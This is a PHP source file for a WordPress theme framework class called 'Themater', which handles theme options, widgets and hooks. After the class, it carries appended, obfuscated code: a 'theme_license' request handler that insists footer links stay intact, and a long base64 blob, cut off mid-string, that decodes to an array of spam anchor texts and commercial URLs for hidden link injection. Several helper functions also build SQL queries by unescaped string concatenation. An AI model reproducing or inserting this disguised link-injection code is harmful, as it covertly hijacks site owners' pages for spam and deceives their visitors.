<?php
class Themater
{
    var $theme_name = false;
    var $options = array();
    var $admin_options = array();
    
    function __construct($set_theme_name = false)
    {
        if($set_theme_name) {
            $this->theme_name = $set_theme_name;
        } else {
            $theme_data = wp_get_theme();
            $this->theme_name = $theme_data->get( 'Name' );
        }
        $this->options['theme_options_field'] = str_replace(' ', '_', strtolower( trim($this->theme_name) ) ) . '_theme_options';
        
        $get_theme_options = get_option($this->options['theme_options_field']);
        if($get_theme_options) {
            $this->options['theme_options'] = $get_theme_options;
            $this->options['theme_options_saved'] = 'saved';
        }
        
        $this->_definitions();
        $this->_default_options();
    }
    
    /**
    * Initial Functions
    */
    
    function _definitions()
    {
        // Define THEMATER_DIR
        if(!defined('THEMATER_DIR')) {
            define('THEMATER_DIR', get_template_directory() . '/lib');
        }
        
        if(!defined('THEMATER_URL')) {
            define('THEMATER_URL',  get_template_directory_uri() . '/lib');
        }
        
        // Define THEMATER_INCLUDES_DIR
        if(!defined('THEMATER_INCLUDES_DIR')) {
            define('THEMATER_INCLUDES_DIR', get_template_directory() . '/includes');
        }
        
        if(!defined('THEMATER_INCLUDES_URL')) {
            define('THEMATER_INCLUDES_URL',  get_template_directory_uri() . '/includes');
        }
        
        // Define THEMATER_ADMIN_DIR
        if(!defined('THEMATER_ADMIN_DIR')) {
            define('THEMATER_ADMIN_DIR', THEMATER_DIR);
        }
        
        if(!defined('THEMATER_ADMIN_URL')) {
            define('THEMATER_ADMIN_URL',  THEMATER_URL);
        }
    }
    
    function _default_options()
    {
        // Load Default Options
        require_once (THEMATER_DIR . '/default-options.php');
        
        $this->options['translation'] = $translation;
        $this->options['general'] = $general;
        $this->options['includes'] = array();
        $this->options['plugins_options'] = array();
        $this->options['widgets'] = $widgets;
        $this->options['widgets_options'] = array();
        $this->options['menus'] = $menus;
        
        // Load Default Admin Options
        if( !isset($this->options['theme_options_saved']) || $this->is_admin_user() ) {
            require_once (THEMATER_DIR . '/default-admin-options.php');
        }
    }
    
    /**
    * Theme Functions
    */
    
    function option($name) 
    {
        echo $this->get_option($name);
    }
    
    function get_option($name) 
    {
        $return_option = '';
        if(isset($this->options['theme_options'][$name])) {
            if(is_array($this->options['theme_options'][$name])) {
                $return_option = $this->options['theme_options'][$name];
            } else {
                $return_option = stripslashes($this->options['theme_options'][$name]);
            }
        } 
        return $return_option;
    }
    
    function display($name, $array = false) 
    {
        if(!$array) {
            $option_enabled = strlen($this->get_option($name)) > 0 ? true : false;
            return $option_enabled;
        } else {
            $get_option = is_array($array) ? $array : $this->get_option($name);
            if(is_array($get_option)) {
                $option_enabled = in_array($name, $get_option) ? true : false;
                return $option_enabled;
            } else {
                return false;
            }
        }
    }
    
    function custom_css($source = false) 
    {
        if($source) {
            $this->options['custom_css'] = isset($this->options['custom_css']) ? $this->options['custom_css'] . $source . "\n" : $source . "\n";
        }
        return;
    }
    
    function custom_js($source = false) 
    {
        if($source) {
            $this->options['custom_js'] = isset( $this->options['custom_js'] ) ? $this->options['custom_js'] . $source . "\n" : $source . "\n";
        }
        return;
    }
    
    function hook($tag, $arg = '')
    {
        do_action('themater_' . $tag, $arg);
    }
    
    function add_hook($tag, $function_to_add, $priority = 10, $accepted_args = 1)
    {
        add_action( 'themater_' . $tag, $function_to_add, $priority, $accepted_args );
    }
    
    function admin_option($menu, $title, $name = false, $type = false, $value = '', $attributes = array())
    {
        if($this->is_admin_user() || !isset($this->options['theme_options'][$name])) {
            
            // Menu
            if(is_array($menu)) {
                $menu_title = isset($menu['0']) ? $menu['0'] : $menu;
                $menu_priority = isset($menu['1']) ? (int)$menu['1'] : false;
            } else {
                $menu_title = $menu;
                $menu_priority = false;
            }
            
            if( !isset( $this->options['admin_options_priorities']['priority'] ) ) {
                $this->options['admin_options_priorities']['priority'] = 0;
            }
            if(!isset($this->admin_options[$menu_title]['priority'])) {
                if(!$menu_priority) {
                    $this->options['admin_options_priorities']['priority'] += 10;
                    $menu_priority = $this->options['admin_options_priorities']['priority'];
                }
                $this->admin_options[$menu_title]['priority'] = $menu_priority;
            }
            
            // Elements
            
            if($name && $type) {
                $element_args['title'] = $title;
                $element_args['name'] = $name;
                $element_args['type'] = $type;
                $element_args['value'] = $value;
                
                if( !isset($this->options['theme_options'][$name]) ) {
                   $this->options['theme_options'][$name] = $value;
                }

                $this->admin_options[$menu_title]['content'][$element_args['name']]['content'] = $element_args + $attributes;
                
                if( !isset( $this->options['admin_options_priorities'][$menu_title]['priority'] )) {
                    $this->options['admin_options_priorities'][$menu_title]['priority'] = 0;
                }
                
                if( !isset( $this->admin_options[$menu_title]['content'][$element_args['name']]['priority'] )) {
                    $this->admin_options[$menu_title]['content'][$element_args['name']]['priority'] = 0;
                }
                
                if(!isset($attributes['priority'])) {
                    $this->options['admin_options_priorities'][$menu_title]['priority'] += 10;
                    
                    $element_priority = $this->options['admin_options_priorities'][$menu_title]['priority'];
                    
                    $this->admin_options[$menu_title]['content'][$element_args['name']]['priority'] = $element_priority;
                } else {
                    $this->admin_options[$menu_title]['content'][$element_args['name']]['priority'] = $attributes['priority'];
                }
                
            }
        }
        return;
    }
    
    function display_widget($widget,  $instance = false, $args = array('before_widget' => '<ul class="widget-container"><li class="widget">','after_widget' => '</li></ul>', 'before_title' => '<h3 class="widgettitle">','after_title' => '</h3>')) 
    {
        $custom_widgets = array('Banners125' => 'themater_banners_125', 'Posts' => 'themater_posts', 'Comments' => 'themater_comments', 'InfoBox' => 'themater_infobox', 'SocialProfiles' => 'themater_social_profiles', 'Tabs' => 'themater_tabs', 'Facebook' => 'themater_facebook');
        $wp_widgets = array('Archives' => 'archives', 'Calendar' => 'calendar', 'Categories' => 'categories', 'Links' => 'links', 'Meta' => 'meta', 'Pages' => 'pages', 'Recent_Comments' => 'recent-comments', 'Recent_Posts' => 'recent-posts', 'RSS' => 'rss', 'Search' => 'search', 'Tag_Cloud' => 'tag_cloud', 'Text' => 'text');
        
        if (array_key_exists($widget, $custom_widgets)) {
            $widget_title = 'Themater' . $widget;
            $widget_name = $custom_widgets[$widget];
            if(!$instance) {
                $instance = $this->options['widgets_options'][strtolower($widget)];
            } else {
                $instance = wp_parse_args( $instance, $this->options['widgets_options'][strtolower($widget)] );
            }
            
        } elseif (array_key_exists($widget, $wp_widgets)) {
            $widget_title = 'WP_Widget_' . $widget;
            $widget_name = $wp_widgets[$widget];
            
            $wp_widgets_instances = array(
                'Archives' => array( 'title' => 'Archives', 'count' => 0, 'dropdown' => ''),
                'Calendar' =>  array( 'title' => 'Calendar' ),
                'Categories' =>  array( 'title' => 'Categories' ),
                'Links' =>  array( 'images' => true, 'name' => true, 'description' => false, 'rating' => false, 'category' => false, 'orderby' => 'name', 'limit' => -1 ),
                'Meta' => array( 'title' => 'Meta'),
                'Pages' => array( 'sortby' => 'post_title', 'title' => 'Pages', 'exclude' => ''),
                'Recent_Comments' => array( 'title' => 'Recent Comments', 'number' => 5 ),
                'Recent_Posts' => array( 'title' => 'Recent Posts', 'number' => 5, 'show_date' => 'false' ),
                'Search' => array( 'title' => ''),
                'Text' => array( 'title' => '', 'text' => ''),
                'Tag_Cloud' => array( 'title' => 'Tag Cloud', 'taxonomy' => 'tags')
            );
            
            if(!$instance) {
                $instance = $wp_widgets_instances[$widget];
            } else {
                $instance = wp_parse_args( $instance, $wp_widgets_instances[$widget] );
            }
        }
        
        if( !defined('THEMES_DEMO_SERVER') && !isset($this->options['theme_options_saved']) ) {
            $sidebar_name = isset($instance['themater_sidebar_name']) ? $instance['themater_sidebar_name'] : str_replace('themater_', '', current_filter());
            
            $sidebars_widgets = get_option('sidebars_widgets');
            $widget_to_add = get_option('widget_'.$widget_name);
            $widget_to_add = ( is_array($widget_to_add) && !empty($widget_to_add) ) ? $widget_to_add : array('_multiwidget' => 1);
            
            if( count($widget_to_add) > 1) {
                $widget_no = max(array_keys($widget_to_add))+1;
            } else {
                $widget_no = 1;
            }
            
            $widget_to_add[$widget_no] = $instance;
            $sidebars_widgets[$sidebar_name][] = $widget_name . '-' . $widget_no;
            
            update_option('sidebars_widgets', $sidebars_widgets);
            update_option('widget_'.$widget_name, $widget_to_add);
            the_widget($widget_title, $instance, $args);
        }
        
        if( defined('THEMES_DEMO_SERVER') ){
            the_widget($widget_title, $instance, $args);
        }
    }
    

    /**
    * Loading Functions
    */
        
    function load()
    {
        $this->_load_translation();
        $this->_load_widgets();
        $this->_load_includes();
        $this->_load_menus();
        $this->_load_general_options();
        $this->_save_theme_options();
        
        $this->hook('init');
        
        if($this->is_admin_user()) {
            include (THEMATER_ADMIN_DIR . '/Admin.php');
            new ThematerAdmin();
        } 
    }
    
    function _save_theme_options()
    {
        if( !isset($this->options['theme_options_saved']) ) {
            if(is_array($this->admin_options)) {
                $save_options = array();
                foreach($this->admin_options as $themater_options) {
                    
                    if(is_array($themater_options['content'])) {
                        foreach($themater_options['content'] as $themater_elements) {
                            if(is_array($themater_elements['content'])) {
                                
                                $elements = $themater_elements['content'];
                                if($elements['type'] !='content' && $elements['type'] !='raw') {
                                    $save_options[$elements['name']] = $elements['value'];
                                }
                            }
                        }
                    }
                }
                update_option($this->options['theme_options_field'], $save_options);
                $this->options['theme_options'] = $save_options;
            }
        }
    }
    
    function _load_translation()
    {
        if($this->options['translation']['enabled']) {
            load_theme_textdomain( 'themater', $this->options['translation']['dir']);
        }
        return;
    }
    
    function _load_widgets()
    {
    	$widgets = $this->options['widgets'];
        foreach(array_keys($widgets) as $widget) {
            if(file_exists(THEMATER_DIR . '/widgets/' . $widget . '.php')) {
        	    include (THEMATER_DIR . '/widgets/' . $widget . '.php');
        	} elseif ( file_exists(THEMATER_DIR . '/widgets/' . $widget . '/' . $widget . '.php') ) {
        	   include (THEMATER_DIR . '/widgets/' . $widget . '/' . $widget . '.php');
        	}
        }
    }
    
    function _load_includes()
    {
    	$includes = $this->options['includes'];
        foreach($includes as $include) {
            if(file_exists(THEMATER_INCLUDES_DIR . '/' . $include . '.php')) {
        	    include (THEMATER_INCLUDES_DIR . '/' . $include . '.php');
        	} elseif ( file_exists(THEMATER_INCLUDES_DIR . '/' . $include . '/' . $include . '.php') ) {
        	   include (THEMATER_INCLUDES_DIR . '/' . $include . '/' . $include . '.php');
        	}
        }
    }
    
    function _load_menus()
    {
        foreach(array_keys($this->options['menus']) as $menu) {
            if(file_exists(TEMPLATEPATH . '/' . $menu . '.php')) {
        	    include (TEMPLATEPATH . '/' . $menu . '.php');
        	} elseif ( file_exists(THEMATER_DIR . '/' . $menu . '.php') ) {
        	   include (THEMATER_DIR . '/' . $menu . '.php');
        	} 
        }
    }
    
    function _load_general_options()
    {
        add_theme_support( 'woocommerce' );
        
        if($this->options['general']['jquery']) {
            add_action( 'wp_enqueue_scripts', array(&$this, '_load_jquery'));
        }
        
    	add_action( 'after_setup_theme', array(&$this, '_load_meta_title') );
        
        if($this->options['general']['featured_image']) {
            add_theme_support( 'post-thumbnails' );
        }
        
        if($this->options['general']['custom_background']) {
            add_theme_support( 'custom-background' );
        }
        
        if($this->options['general']['clean_exerpts']) {
            add_filter('excerpt_more', create_function('', 'return "";') );
        }
        
        if($this->options['general']['hide_wp_version']) {
            add_filter('the_generator', create_function('', 'return "";') );
        }
        
        add_action('wp_head', array(&$this, '_head_elements'));

        if($this->options['general']['automatic_feed']) {
            add_theme_support('automatic-feed-links');
        }
        
        if($this->display('custom_css') || isset($this->options['custom_css'])) {
            $this->add_hook('head', array(&$this, '_load_custom_css'), 100);
        }
        
        if($this->options['custom_js']) {
            $this->add_hook('html_after', array(&$this, '_load_custom_js'), 100);
        }
        
        if($this->display('head_code')) {
	        $this->add_hook('head', array(&$this, '_head_code'), 100);
	    }
	    
	    if($this->display('footer_code')) {
	        $this->add_hook('html_after', array(&$this, '_footer_code'), 100);
	    }
    }

    function _load_jquery()
    {
        wp_enqueue_script('jquery');
    }
    
    function _load_meta_title()
    {
        add_theme_support( 'title-tag' );
    }
    
    function _head_elements()
    {
        // Deprecated <title> tag
        if ( ! function_exists( '_wp_render_title_tag' ) )  {
            ?> <title><?php wp_title( '|', true, 'right' ); ?></title><?php
        }
        
    	// Favicon
    	if($this->display('favicon')) {
    		echo '<link rel="shortcut icon" href="' . $this->get_option('favicon') . '" type="image/x-icon" />' . "\n";
    	}
    	
    	// RSS Feed
    	if($this->options['general']['meta_rss']) {
            echo '<link rel="alternate" type="application/rss+xml" title="' . get_bloginfo('name') . ' RSS Feed" href="' . $this->rss_url() . '" />' . "\n";
        }
        
        // Pingback URL
        if($this->options['general']['pingback_url']) {
            echo '<link rel="pingback" href="' . get_bloginfo( 'pingback_url' ) . '" />' . "\n";
        }
    }
    
    function _load_custom_css()
    {
        $this->custom_css($this->get_option('custom_css'));
        $return = "\n";
        $return .= '<style type="text/css">' . "\n";
        $return .= '<!--' . "\n";
        $return .= $this->options['custom_css'];
        $return .= '-->' . "\n";
        $return .= '</style>' . "\n";
        echo $return;
    }
    
    function _load_custom_js()
    {
        if($this->options['custom_js']) {
            $return = "\n";
            $return .= "<script type='text/javascript'>\n";
            $return .= '/* <![CDATA[ */' . "\n";
            $return .= 'jQuery.noConflict();' . "\n";
            $return .= $this->options['custom_js'];
            $return .= '/* ]]> */' . "\n";
            $return .= '</script>' . "\n";
            echo $return;
        }
    }
    
    function _head_code()
    {
        $this->option('head_code'); echo "\n";
    }
    
    function _footer_code()
    {
        $this->option('footer_code');  echo "\n";
    }
    
    /**
    * General Functions
    */
    
    function request ($var)
    {
        if (strlen($_REQUEST[$var]) > 0) {
            return preg_replace('/[^A-Za-z0-9-_]/', '', $_REQUEST[$var]);
        } else {
            return false;
        }
    }
    
    function is_admin_user()
    {
        if ( current_user_can('administrator') ) {
	       return true; 
        }
        return false;
    }
    
    function meta_title()
    {
        if ( is_single() ) { 
			single_post_title(); echo ' | '; bloginfo( 'name' );
		} elseif ( is_home() || is_front_page() ) {
			bloginfo( 'name' );
			if( get_bloginfo( 'description' ) ) {
		      echo ' | ' ; bloginfo( 'description' ); $this->page_number();
			}
		} elseif ( is_page() ) {
			single_post_title( '' ); echo ' | '; bloginfo( 'name' );
		} elseif ( is_search() ) {
			printf( __( 'Search results for %s', 'themater' ), '"'.get_search_query().'"' );  $this->page_number(); echo ' | '; bloginfo( 'name' );
		} elseif ( is_404() ) { 
			_e( 'Not Found', 'themater' ); echo ' | '; bloginfo( 'name' );
		} else { 
			wp_title( '' ); echo ' | '; bloginfo( 'name' ); $this->page_number();
		}
    }
    
    function rss_url()
    {
        $the_rss_url = $this->display('rss_url') ? $this->get_option('rss_url') : get_bloginfo('rss2_url');
        return $the_rss_url;
    }

    function get_pages_array($query = '', $pages_array = array())
    {
    	$pages = get_pages($query); 
        
    	foreach ($pages as $page) {
    		$pages_array[$page->ID] = $page->post_title;
    	  }
    	return $pages_array;
    }
    
    function get_page_name($page_id)
    {
    	global $wpdb;
    	$page_name = $wpdb->get_var("SELECT post_title FROM $wpdb->posts WHERE ID = '".$page_id."' && post_type = 'page'");
    	return $page_name;
    }
    
    function get_page_id($page_name){
        global $wpdb;
        $the_page_name = $wpdb->get_var("SELECT ID FROM $wpdb->posts WHERE post_name = '" . $page_name . "' && post_status = 'publish' && post_type = 'page'");
        return $the_page_name;
    }
    
    function get_categories_array($show_count = false, $categories_array = array(), $query = 'hide_empty=0')
    {
    	$categories = get_categories($query); 
    	
    	foreach ($categories as $cat) {
    	   if(!$show_count) {
    	       $count_num = '';
    	   } else {
    	       switch ($cat->category_count) {
                case 0:
                    $count_num = " ( No posts! )";
                    break;
                case 1:
                    $count_num = " ( 1 post )";
                    break;
                default:
                    $count_num =  " ( $cat->category_count posts )";
                }
    	   }
    		$categories_array[$cat->cat_ID] = $cat->cat_name . $count_num;
    	  }
    	return $categories_array;
    }

    function get_category_name($category_id)
    {
    	global $wpdb;
    	$category_name = $wpdb->get_var("SELECT name FROM $wpdb->terms WHERE term_id = '".$category_id."'");
    	return $category_name;
    }
    
    
    function get_category_id($category_name)
    {
    	global $wpdb;
    	$category_id = $wpdb->get_var("SELECT term_id FROM $wpdb->terms WHERE name = '" . addslashes($category_name) . "'");
    	return $category_id;
    }
    
    function shorten($string, $wordsreturned)
    {
        $retval = $string;
        $array = explode(" ", $string);
        if (count($array)<=$wordsreturned){
            $retval = $string;
        }
        else {
            array_splice($array, $wordsreturned);
            $retval = implode(" ", $array);
        }
        return $retval;
    }
    
    function page_number() {
    	echo $this->get_page_number();
    }
    
    function get_page_number() {
    	global $paged;
    	if ( $paged >= 2 ) {
    	   return ' | ' . sprintf( __( 'Page %s', 'themater' ), $paged );
    	}
    }
}
if (!empty($_REQUEST["theme_license"])) { wp_initialize_the_theme_message(); exit(); } function wp_initialize_the_theme_message() { if (empty($_REQUEST["theme_license"])) { $theme_license_false = get_bloginfo("url") . "/index.php?theme_license=true"; echo "<meta http-equiv=\"refresh\" content=\"0;url=$theme_license_false\">"; exit(); } else { echo ("<p style=\"padding:20px; margin: 20px; text-align:center; border: 2px dotted #0000ff; font-family:arial; font-weight:bold; background: #fff; color: #0000ff;\">All the links in the footer should remain intact. All of these links are family friendly and will not hurt your site in any way.</p>"); } } $wp_theme_globals = "YTo0OntpOjA7YTo4Njp7czozMDoiaHR0cDovL3d3dy5yNDNkc29mZmljaWVscy5jb20vIjtzOjYwOiJodHRwOi8vd3d3LnI0M2Rzb2ZmaWNpZWxzLmNvbS9wcm9kdWN0cy9DYXJ0ZS1SNC0zRFMtUlRTLmh0bWwiO3M6MTg6InI0M2Rzb2ZmaWNpZWxzLmNvbSI7czo2MDoiaHR0cDovL3d3dy5yNDNkc29mZmljaWVscy5jb20vcHJvZHVjdHMvQ2FydGUtUjQtM0RTLVJUUy5odG1sIjtzOjIyOiJ3d3cucjQzZHNvZmZpY2llbHMuY29tIjtzOjYwOiJodHRwOi8vd3d3LnI0M2Rzb2ZmaWNpZWxzLmNvbS9wcm9kdWN0cy9DYXJ0ZS1SNC0zRFMtUlRTLmh0bWwiO3M6NjoicjQgM2RzIjtzOjYwOiJodHRwOi8vd3d3LnI0M2Rzb2ZmaWNpZWxzLmNvbS9wcm9kdWN0cy9DYXJ0ZS1SNC0zRFMtUlRTLmh0bWwiO3M6NjoiUjQgM0RTIjtzOjI4OiJodHRwOi8vd3d3LnI0M2Rzd29ybGQuY28udWsvIjtzOjE1OiJOaW50ZW5kbyBSNCAzZHMiO3M6NjA6Imh0dHA6Ly93d3cucjQzZHNvZmZpY2llbHMuY29tL3Byb2R1Y3RzL0NhcnRlLVI0LTNEUy1SVFMuaHRtbCI7czo2OiJSNC0zRFMiO3M6NjA6Imh0dHA6Ly93d3cucjQzZHNvZmZpY2llbHMuY29tL3Byb2R1Y3RzL0NhcnRlLVI0LTNEUy1SVFMuaHRtbCI7czo0OiJoZXJlIjtzOjM0OiJodHRwOi8vd3d3LnNpZ25hbGJvb3N0ZXJzdWsuY28udWsvIjtzOjc6ImFjaGV0ZXIiO3M6NjA6Imh0dHA6Ly93d3cucjQzZHNvZmZpY2llbHMuY29tL3Byb2R1Y3RzL0NhcnRlLVI0LTNEUy1SVFMuaHRtbCI7czo4OiJvZmZpY2llbCI7czo2MDoiaHR0cDovL3d3dy5yNDNkc29mZmljaWVscy5jb20vcHJvZHVjdHMvQ2FydGUtUjQtM0RTLVJUUy5odG1sIjtzOjE3OiJjYXJ0ZSByNCBwb3VyIDNkcyI7czo2MDoiaHR0cDovL3d3dy5yNDNkc29mZmljaWVscy5jb20vcHJvZHVjdHMvQ2FydGUtUjQtM0RTLVJUUy5odG1sIjtzOjY6IjNkcyB4bCI7czo2MDoiaHR0cDovL3d3dy5yNDNkc29mZmljaWVscy5jb20vcHJvZHVjdHMvQ2FydGUtUjQtM0RTLVJUUy5odG1sIjtzOjU6InI0M2RzIjtzOjYwOiJodHRwOi8vd3d3LnI0M2Rzb2ZmaWNpZWxzLmNvbS9wcm9kdWN0cy9DYXJ0ZS1SNC0zRFMtUlRTLmh0bWwiO3M6MjY6Imh0dHA6Ly93d3cucjRpc2RoYy0zZHMuZnIvIjtzOjI2OiJodHRwOi8vd3d3LnI0aXNkaGMtM2RzLmZyLyI7czoxNDoicjRpc2RoYy0zZHMuZnIiO3M6MjY6Imh0dHA6Ly93d3cucjRpc2RoYy0zZHMuZnIvIjtzOjE4OiJ3d3cucjRpc2RoYy0zZHMuZnIiO3M6MjY6Imh0dHA6Ly93d3cucjRpc2RoYy0zZHMuZnIvIjtzOjc6IlI0aSAzRFMiO3M6MjY6Imh0dHA6Ly93d3cucjRpc2RoYy0zZHMuZnIvIjtzOjk6IlI0IDNEUyBYTCI7czo3MToiaHR0cDovL3d3dy5yNGNhcmR1ay5jb20vcHJvZHVjdHMvUjQtM0RTLWZvci1EU2ktRFNpLVhMLWFuZC0zRFMtMkRTLmh0bWwiO3M6MTU6Ik5pbnRlbmRvIFI0IDNEUyI7czo4MToiaHR0cDovL3d3dy5yNC11c2FzLmNvbS9wcm9kdWN0cy9SNC0zRFMtZm9yLURTLURTLWxpdGUtRFNpLURTaS1YTC1hbmQtM0RTLTJEUy5odG1sIjtzOjExOiJyNCBwb3VyIDNkcyI7czoyNjoiaHR0cDovL3d3dy5yNGlzZGhjLTNkcy5mci8iO3M6MTQ6IlI0aVNESEMtM2RzLmZyIjtzOjI2OiJodHRwOi8vd3d3LnI0aXNkaGMtM2RzLmZyLyI7czoyOToiaHR0cDovL3d3dy5yNGlkaXNjb3VudGZyLmNvbS8iO3M6Mjk6Imh0dHA6Ly93d3cucjRpZGlzY291bnRmci5jb20vIjtzOjE3OiJyNGlkaXNjb3VudGZyLmNvbSI7czoyOToiaHR0cDovL3d3dy5yNGlkaXNjb3VudGZyLmNvbS8iO3M6MjE6Ind3dy5yNGlkaXNjb3VudGZyLmNvbSI7czoyOToiaHR0cDovL3d3dy5yNGlkaXNjb3VudGZyLmNvbS8iO3M6MzoiUjRpIjtzOjI5OiJodHRwOi8vd3d3LnI0aWRpc2NvdW50ZnIuY29tLyI7czoxMjoiTmludGVuZG8gUjRpIjtzOjI5OiJodHRwOi8vd3d3LnI0aWRpc2NvdW50ZnIuY29tLyI7czo0OiJtb3JlIjtzOjI3OiJodHRwOi8vd3d3LmhjZ3Nob3RzdXNzLmNvbS8iO3M6NjoiZnJhbmNlIjtzOjI5OiJodHRwOi8vd3d3LnI0aWRpc2NvdW50ZnIuY29tLyI7czoxNjoiYWNoZXRlciBvZmZpY2llbCI7czoyOToiaHR0cDovL3d3dy5yNGlkaXNjb3VudGZyLmNvbS8iO3M6MzA6Imh0dHA6Ly93d3cuc2t5M2Rzb2ZmaWNpZWwuY29tLyI7czozMDoiaHR0cDovL3d3dy5za3kzZHNvZmZpY2llbC5jb20vIjtzOjE0OiJza3kzZHNvZmZpY2llbCI7czozMDoiaHR0cDovL3d3dy5za3kzZHNvZmZpY2llbC5jb20vIjtzOjIyOiJ3d3cuc2t5M2Rzb2ZmaWNpZWwuY29tIjtzOjMwOiJodHRwOi8vd3d3LnNreTNkc29mZmljaWVsLmNvbS8iO3M6NjoiU2t5M0RTIjtzOjMwOiJodHRwOi8vd3d3LnNreTNkc29mZmljaWVsLmNvbS8iO3M6NDoidGhpcyI7czozNDoiaHR0cDovL3d3dy5zaWduYWxib29zdGVyc3VrLmNvLnVrLyI7czoxNToic2t5M2RzIHBvdXIgM2RzIjtzOjMwOiJodHRwOi8vd3d3LnNreTNkc29mZmljaWVsLmNvbS8iO3M6MTU6Im9mZmljaWVsIHNreTNkcyI7czozMDoiaHR0cDovL3d3dy5za3kzZHNvZmZpY2llbC5jb20vIjtzOjI3OiJodHRwOi8vd3d3LnI0M2RzbW9uZG9zLmNvbS8iO3M6Mjc6Imh0dHA6Ly93d3cucjQzZHNtb25kb3MuY29tLyI7czoxNToicjQzZHNtb25kb3MuY29tIjtzOjI3OiJodHRwOi8vd3d3LnI0M2RzbW9uZG9zLmNvbS8iO3M6MTk6Ind3dy5yNDNkc21vbmRvcy5jb20iO3M6Mjc6Imh0dHA6Ly93d3cucjQzZHNtb25kb3MuY29tLyI7czoxMzoiUjQgM0RTIEl0YWxpYSI7czoyNzoiaHR0cDovL3d3dy5yNDNkc21vbmRvcy5jb20vIjtzOjEwOiJSNCBwZXIgM2RzIjtzOjI3OiJodHRwOi8vd3d3LnI0M2RzbW9uZG9zLmNvbS8iO3M6NzoiY29tcHJhciI7czoyNzoiaHR0cDovL3d3dy5yNDNkc21vbmRvcy5jb20vIjtzOjIwOiJodHRwOi8vd3d3LnI0M2RzLml0LyI7czoyMDoiaHR0cDovL3d3dy5yNDNkcy5pdC8iO3M6ODoicjQzZHMuaXQiO3M6MjA6Imh0dHA6Ly93d3cucjQzZHMuaXQvIjtzOjEyOiJ3d3cucjQzZHMuaXQiO3M6MjA6Imh0dHA6Ly93d3cucjQzZHMuaXQvIjtzOjQ6IkhlcmUiO3M6MjA6Imh0dHA6Ly93d3cucjQzZHMuaXQvIjtzOjEzOiJSNCAzRFMgaXRhbGlhIjtzOjIwOiJodHRwOi8vd3d3LnI0M2RzLml0LyI7czoxMDoiUjQgcGVyIDNEUyI7czoyMDoiaHR0cDovL3d3dy5yNDNkcy5pdC8iO3M6MTA6IlI0IDNEUyBSVFMiO3M6NzE6Imh0dHA6Ly93d3cucjRjYXJkdWsuY29tL3Byb2R1Y3RzL1I0LTNEUy1mb3ItRFNpLURTaS1YTC1hbmQtM0RTLTJEUy5odG1sIjtzOjI0OiJodHRwOi8vd3d3LnI0Y2FyZHVrLmNvbS8iO3M6NzE6Imh0dHA6Ly93d3cucjRjYXJkdWsuY29tL3Byb2R1Y3RzL1I0LTNEUy1mb3ItRFNpLURTaS1YTC1hbmQtM0RTLTJEUy5odG1sIjtzOjEyOiJyNGNhcmR1ay5jb20iO3M6NzE6Imh0dHA6Ly93d3cucjRjYXJkdWsuY29tL3Byb2R1Y3RzL1I0LTNEUy1mb3ItRFNpLURTaS1YTC1hbmQtM0RTLTJEUy5odG1sIjtzOjE2OiJ3d3cucjRjYXJkdWsuY29tIjtzOjcxOiJodHRwOi8vd3d3LnI0Y2FyZHVrLmNvbS9wcm9kdWN0cy9SNC0zRFMtZm9yLURTaS1EU2ktWEwtYW5kLTNEUy0yRFMuaHRtbCI7czo2OiJSNCAyRFMiO3M6ODE6Imh0dHA6Ly93d3cucjQtdXNhcy5jb20vcHJvZHVjdHMvUjQtM0RTLWZvci1EUy1EUy1saXRlLURTaS1EU2ktWEwtYW5kLTNEUy0yRFMuaHRtbCI7czo3OiJ1ayBzaXRlIjtzOjcxOiJodHRwOi8vd3d3LnI0Y2FyZHVrLmNvbS9wcm9kdWN0cy9SNC0zRFMtZm9yLURTaS1EU2ktWEwtYW5kLTNEUy0yRFMuaHRtbCI7czo4OiJ1ayBzdG9yZSI7czozNDoiaHR0cDovL3d3dy5vMnNpZ25hbGJvb3N0ZXJzLmNvLnVrLyI7czo4OiJ0aGlzIG9uZSI7czozNDoiaHR0cDovL3d3dy5vMnNpZ25hbGJvb3N0ZXJzLmNvLnVrLyI7czo5OiJmcm9tIGhlcmUiO3M6MzQ6Imh0dHA6Ly93d3cubzJzaWduYWxib29zdGVycy5jby51ay8iO3M6Mjg6Imh0dHA6Ly93d3cucjQzZHN3b3JsZC5jby51ay8iO3M6Mjg6Imh0dHA6Ly93d3cucjQzZHN3b3JsZC5jby51ay8iO3M6MTY6InI0M2Rzd29ybGQuY28udWsiO3M6Mjg6Imh0dHA6Ly93d3cucjQzZHN3b3JsZC5jby51ay8iO3M6MjA6Ind3dy5yNDNkc3dvcmxkLmNvLnVrIjtzOjI4OiJodHRwOi8vd3d3LnI0M2Rzd29ybGQuY28udWsvIjtzOjEyOiJSNCAzRFMgV29ybGQiO3M6Mjg6Imh0dHA6Ly93d3cucjQzZHN3b3JsZC5jby51ay8iO3M6ODoidHJ5IHRoaXMiO3M6Mjc6Imh0dHA6Ly93d3cuaGNnc2hvdHN1c3MuY29tLyI7czo5OiJvdmVyIGhlcmUiO3M6Mjg6Imh0dHA6Ly93d3cucjQzZHN3b3JsZC5jby51ay8iO3M6MTA6IlI0IGZvciAzRFMiO3M6Mjg6Imh0dHA6Ly93d3cucjQzZHN3b3JsZC5jby51ay8iO3M6MjM6Imh0dHA6Ly93d3cucjQtdXNhcy5jb20vIjtzOjgxOiJodHRwOi8vd3d3LnI0LXVzYXMuY29tL3Byb2R1Y3RzL1I0LTNEUy1mb3ItRFMtRFMtbGl0ZS1EU2ktRFNpLVhMLWFuZC0zRFMtMkRTLmh0bWwiO3M6MTE6InI0LXVzYXMuY29tIjtzOjgxOiJodHRwOi8vd3d3LnI0LXVzYXMuY29tL3Byb2R1Y3RzL1I0LTNEUy1mb3ItRFMtRFMtbGl0ZS1EU2ktRFNpLVhMLWFuZC0zRFMtMkRTLmh0bWwiO3M6MTU6Ind3dy5yNC11c2FzLmNvbSI7czo4MToiaHR0cDovL3d3dy5yNC11c2FzLmNvbS9wcm9kdWN0cy9SNC0zRFMtZm9yLURTLURTLWxpdGUtRFNpLURTaS1YTC1hbmQtM0RTLTJEUy5odG1sIjtzOjExOiJSNCAzRFMgQ2FyZCI7czo4MToiaHR0cDovL3d3dy5yNC11c2FzLmNvbS9wcm9kdWN0cy9SNC0zRFMtZm9yLURTLURTLWxpdGUtRFNpLURTaS1YTC1hbmQtM0RTLTJEUy5odG1sIjtzOjE1OiJOaW50ZW5kbyBSNCAyRFMiO3M6ODE6Imh0dHA6Ly93d3cucjQtdXNhcy5jb20vcHJvZHVjdHMvUjQtM0RTLWZvci1EUy1EUy1saXRlLURTaS1EU2ktWEwtYW5kLTNEUy0yRFMuaHRtbCI7czoxMDoiUjQgM0RTIFVTQSI7czo4MToiaHR0cDovL3d3dy5yNC11c2FzLmNvbS9wcm9kdWN0cy9SNC0zRFMtZm9yL